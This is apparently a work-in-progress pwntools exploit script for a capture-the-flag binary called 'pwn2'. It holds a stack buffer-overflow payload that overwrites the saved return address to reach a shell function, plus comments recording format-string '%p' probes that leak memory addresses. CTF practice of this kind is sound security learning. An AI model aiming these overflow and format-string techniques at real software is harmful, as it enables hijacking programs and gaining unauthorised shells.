from pwn import *

context(arch = 'amd64', os = 'linux', terminal=['tmux', 'split-window', '-h'])

io = process("./pwn2")
gdb.attach(io, gdbscript='b *0x400AB2')

print(io.recvuntil(b">", drop=False))

payload = 128 * b"A"
payload += p64(0x0)             # rbp
payload += p64(0x400AB2)        # rip, shell is 0x400b8e
payload += b"A"                 # null byte terminator

io.sendline(payload)
io.interactive()

# We can see that there's a \n, so we can try to pass format strings to leak information.
# Let's try: `%p %p %p %p %p %p`
# ```
# $ ./pwn2                                                                                                                                                                             nix-shell radare2 
# I have protected my stack so shell() is safe now!
# Give me some input
# > %p %p %p %p %p %p
# Alright you gave me 0x7ffe74b45dc0 0x6b5720 0x433b60 0x15a3880 0x14 0x31

# Give me some input
# ```
# We can see that the second parameters don't change: 0x6b5720 0x433b60 

# TODO: File & checksec